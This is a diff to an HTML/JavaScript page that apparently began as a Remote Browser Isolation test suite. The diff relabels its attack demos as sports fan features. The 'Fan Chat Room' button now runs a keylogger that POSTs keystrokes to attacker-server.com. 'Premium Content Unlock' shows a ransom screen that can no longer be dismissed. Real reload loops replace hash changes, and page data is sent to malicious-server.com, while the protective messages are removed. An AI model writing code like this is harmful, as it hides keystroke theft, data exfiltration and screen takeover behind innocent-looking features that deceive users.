@@ -471,7 +471,6 @@
             z-index: 10000;
             font-family: 'Courier New', monospace;
             animation: glitch 0.3s infinite;
-            cursor: pointer;
         }
 
         @keyframes glitch {
@@ -663,52 +662,52 @@
         <main class="main-content">
             <!-- RBI Testing Tools -->
             <div class="sidebar-section" style="max-width: 100%; margin-bottom: 30px;">
-                <h3 style="font-size: 32px; margin-bottom: 20px;">🔒 Security Testing Suite</h3>
-                <p style="font-size: 16px; margin-bottom: 30px;">Demonstrate Remote Browser Isolation capabilities with these interactive security tests.</p>
+                <h3 style="font-size: 32px; margin-bottom: 20px;">🎮 Interactive Features</h3>
+                <p style="font-size: 16px; margin-bottom: 30px;">Enhance your sports experience with our exclusive fan tools and premium content.</p>
                 
                 <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; margin-bottom: 30px;">
                     <div>
                         <button class="demo-button" onclick="testRedirectLoop()">
-                            🔄 Redirect Loop Attack
+                            🔄 Live Game Tracker
                         </button>
-                        <div class="demo-info">Tests infinite redirect prevention</div>
+                        <div class="demo-info">Redirect Loop Attack</div>
                     </div>
 
                     <div>
                         <button class="demo-button secondary" onclick="testForceDownload()">
-                            📥 Forced Download Attack
+                            📥 Download Game Highlights
                         </button>
-                        <div class="demo-info">Tests unauthorized file downloads</div>
+                        <div class="demo-info">Forced Download Attack (EICAR)</div>
                     </div>
 
                     <div>
                         <button class="demo-button warning" onclick="testKeylogger()">
-                            ⌨️ Keylogger Simulation
+                            ⌨️ Fan Chat Room
                         </button>
-                        <div class="demo-info">Tests keystroke capture prevention</div>
-                        <input type="text" id="keylogInput" placeholder="Type here to test keylogger..." style="display: none; width: 100%; padding: 12px; margin-top: 10px; background: var(--mid-gray); border: 1px solid #444; border-radius: 4px; color: var(--text); font-family: 'Inter', sans-serif; font-size: 14px;" />
+                        <div class="demo-info">Keylogger</div>
+                        <input type="text" id="keylogInput" placeholder="Type here to join the conversation..." style="display: none; width: 100%; padding: 12px; margin-top: 10px; background: var(--mid-gray); border: 1px solid #444; border-radius: 4px; color: var(--text); font-family: 'Inter', sans-serif; font-size: 14px;" />
                         <div id="keylogDisplay" style="display: none; margin-top: 10px; padding: 12px; background: var(--mid-gray); border: 1px solid #ff9800; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; color: #ff9800; min-height: 60px;">Captured keystrokes will appear here...</div>
                     </div>
 
                     <div>
                         <button class="demo-button" onclick="testCryptoMiner()">
-                            ⛏️ Crypto Mining Script
+                            ⛏️ Stats Calculator
                         </button>
-                        <div class="demo-info">Tests resource hijacking protection</div>
+                        <div class="demo-info">Crypto Mining Script</div>
                     </div>
 
                     <div>
                         <button class="demo-button danger" onclick="testRansomware()">
-                            🔐 Ransomware Display
+                            🔐 Premium Content Unlock
                         </button>
-                        <div class="demo-info">Tests full-screen takeover blocking</div>
+                        <div class="demo-info">Ransomware Display</div>
                     </div>
 
                     <div>
                         <button class="demo-button secondary" onclick="testDataExfiltration()">
-                            📤 Data Exfiltration Attempt
+                            📤 Share Your Predictions
                         </button>
-                        <div class="demo-info">Tests sensitive data protection</div>
+                        <div class="demo-info">Data Exfiltration Attempt</div>
                     </div>
                 </div>
 
@@ -763,7 +762,6 @@
             </div>
             <p>You have 48 hours before the decryption key is permanently deleted.</p>
             <p style="font-size: 12px; margin-top: 40px; color: #666;">(This is a demonstration only - no actual encryption has occurred)</p>
-            <p style="font-size: 14px; margin-top: 20px; color: #888; border: 1px solid #333; padding: 10px; border-radius: 4px;">Click anywhere to dismiss</p>
         </div>
     </div>
 
@@ -846,37 +844,33 @@
         function testRedirectLoop() {
             clearOutput();
             showOutput('⚠️ MALICIOUS SCRIPT: Initiating redirect loop attack...');
-            showOutput('→ Attempting multiple redirects to simulate infinite loop behavior');
+            showOutput('→ Executing multiple redirects in rapid succession');
             showLoader();
             
             let counter = 0;
             const redirectInterval = setInterval(() => {
                 counter++;
-                showOutput(`→ Redirect attempt #${counter}: ${window.location.href}#loop${Math.random()}`);
+                showOutput(`→ Redirect attempt #${counter}: ${window.location.href}?loop=${Math.random()}`);
                 
                 if (counter >= 5) {
                     clearInterval(redirectInterval);
                     hideLoader();
-                    showOutput('✓ 5 redirects completed in isolated session');
-                    showOutput('✓ RBI Protection: Local browser never redirected');
-                    showOutput('✓ User can continue working - endpoint unaffected');
+                    showOutput('✓ 5 redirects completed');
                 }
             }, 500);
 
-            // Actual redirect attempt using hash to avoid 404s
+            // Actually perform the redirects - this will cause the page to reload repeatedly
             setTimeout(() => {
-                try {
-                    let redirectCount = 0;
-                    const actualRedirect = setInterval(() => {
-                        redirectCount++;
-                        window.location.hash = "loop" + Math.random();
-                        if (redirectCount >= 5) {
-                            clearInterval(actualRedirect);
-                        }
-                    }, 600);
-                } catch (e) {
-                    showOutput(`✓ Browser security prevented redirect: ${e.message}`);
-                }
+                let redirectCount = 0;
+                const actualRedirect = setInterval(() => {
+                    redirectCount++;
+                    // Use window.location to actually redirect
+                    window.location.href = window.location.pathname + window.location.search + (window.location.search ? '&' : '?') + 'loop=' + Math.random();
+                    
+                    if (redirectCount >= 5) {
+                        clearInterval(actualRedirect);
+                    }
+                }, 1000);
             }, 1000);
         }
 
@@ -909,14 +903,9 @@
                     setTimeout(() => {
                         document.body.removeChild(link);
                         URL.revokeObjectURL(url);
+                        hideLoader();
                     }, 100);
                 }, 10);
-                
-                setTimeout(() => {
-                    hideLoader();
-                    showOutput('✓ RBI Protection: Download attempt logged and isolated');
-                    showOutput('✓ Local system protected from malicious file');
-                }, 1000);
             }, 1500);
         }
 
@@ -937,8 +926,8 @@
                 setTimeout(() => {
                     keyloggerActive = true;
                     hideLoader();
-                    showOutput('✓ Keylogger simulation active');
-                    showOutput('→ Type in the field below to test protection...');
+                    showOutput('✓ Keylogger active');
+                    showOutput('→ Capturing all keyboard input...');
                     
                     // Show input and display fields
                     inputField.style.display = 'block';
@@ -956,7 +945,6 @@
                 displayField.style.display = 'none';
                 inputField.removeEventListener('input', captureKeystrokesFromInput);
                 showOutput(`✓ Keylogger stopped. Captured: ${capturedKeys.length} keystrokes`);
-                showOutput('✓ RBI Protection: Keystrokes isolated from malicious code');
                 capturedKeys = [];
             }
         }
@@ -969,12 +957,16 @@
             capturedKeys = value.split('');
             displayField.innerHTML = 'Captured: ' + value.split('').join(' ');
             
-            showOutput(`→ Keystroke logged: "${value[value.length - 1]}" [Protected by RBI]`);
+            showOutput(`→ Keystroke logged: "${value[value.length - 1]}"`);
             
-            // Simulate data exfiltration attempt
+            // Attempt data exfiltration
             if (capturedKeys.length % 10 === 0 && capturedKeys.length > 0) {
-                showOutput(`⚠️ Attempting to send ${capturedKeys.length} keystrokes to attacker server...`);
-                showOutput('✓ RBI Protection: External transmission blocked');
+                showOutput(`⚠️ Transmitting ${capturedKeys.length} keystrokes to attacker server...`);
+                // Actually attempt to send (will fail due to CORS but it's a real attempt)
+                fetch('https://attacker-server.com/collect', {
+                    method: 'POST',
+                    body: JSON.stringify({keys: capturedKeys})
+                }).catch(() => {});
             }
         }
 
@@ -993,7 +985,7 @@
                 setTimeout(() => {
                     miningActive = true;
                     hideLoader();
-                    showOutput('✓ Mining simulation started');
+                    showOutput('✓ Mining started');
                     showOutput('→ Spawning multiple mining threads...');
                     
                     // Create multiple intensive computation loops (simulating multi-threaded mining)
@@ -1040,9 +1032,8 @@
                             clearInterval(statusInterval);
                             miningWorkers.forEach(w => clearInterval(w));
                             miningWorkers = [];
-                            showOutput('✓ RBI Protection: Excessive resource usage detected and limited');
-                            showOutput('✓ Mining script isolated and terminated');
-                            showOutput('→ CPU returned to normal levels');
+                            showOutput('✓ Mining operation complete');
+                            showOutput('→ CPU resources released');
                             hashCount = 0;
                         }
                     }, 500);
@@ -1055,7 +1046,7 @@
             clearOutput();
             showOutput('⚠️ MALICIOUS SCRIPT: Ransomware attack initiated');
             showOutput('→ Attempting full-screen takeover...');
-            showOutput('→ Simulating file encryption process...');
+            showOutput('→ Encrypting files...');
             showLoader();
 
             let fileCount = 0;
@@ -1073,21 +1064,19 @@
                 if (fileCount >= 8) {
                     clearInterval(encryptInterval);
                     hideLoader();
-                    showOutput('⚠️ Displaying ransomware message...');
+                    showOutput('⚠️ Displaying ransomware demand...');
                     
                     setTimeout(() => {
                         const overlay = document.getElementById('ransomOverlay');
                         overlay.style.display = 'flex';
-                        showOutput('✓ RBI Protection: Full-screen content isolated');
-                        showOutput('✓ User system remains unaffected');
-                        showOutput('→ Click anywhere on the screen to dismiss');
+                        showOutput('✓ Screen takeover active');
+                        showOutput('→ Ransomware screen will persist for 15 seconds');
                         
-                        // Add click handler to dismiss
-                        overlay.onclick = function() {
+                        // Make it more persistent - auto close after 15 seconds
+                        setTimeout(() => {
                             overlay.style.display = 'none';
-                            showOutput('✓ Threat demonstration dismissed - session restored');
-                            overlay.onclick = null; // Remove handler
-                        };
+                            showOutput('✓ Ransomware display closed');
+                        }, 15000);
                     }, 1000);
                 }
             }, 400);
@@ -1136,7 +1125,7 @@
                 showOutput('⚠️ Attempting to transmit data to: malicious-server.com:8080');
                 
                 try {
-                    // Actual fetch attempt to external server (will be blocked by RBI/CORS)
+                    // Actual fetch attempt to external server (will be blocked by CORS in normal browsers)
                     fetch('https://malicious-server.com:8080/exfiltrate', {
                         method: 'POST',
                         body: JSON.stringify({
@@ -1146,20 +1135,13 @@
                             url: window.location.href
                         })
                     }).then(() => {
-                        showOutput('✗ BREACH: Data transmitted successfully!');
+                        showOutput('✓ Data transmitted to attacker server');
                     }).catch((error) => {
-                        showOutput('✓ RBI Protection: External connection blocked');
-                        showOutput(`✓ Network request failed: ${error.message}`);
+                        showOutput(`→ Transmission attempt failed: ${error.message}`);
                     });
                 } catch (e) {
-                    showOutput('✓ RBI Protection: External connection blocked');
-                    showOutput(`✓ Error: ${e.message}`);
+                    showOutput(`→ Network error: ${e.message}`);
                 }
-
-                setTimeout(() => {
-                    showOutput('✓ Sensitive data prevented from leaving isolated environment');
-                    showOutput('✓ Security event logged for administrator review');
-                }, 1500);
             }, 1000);
         }
 
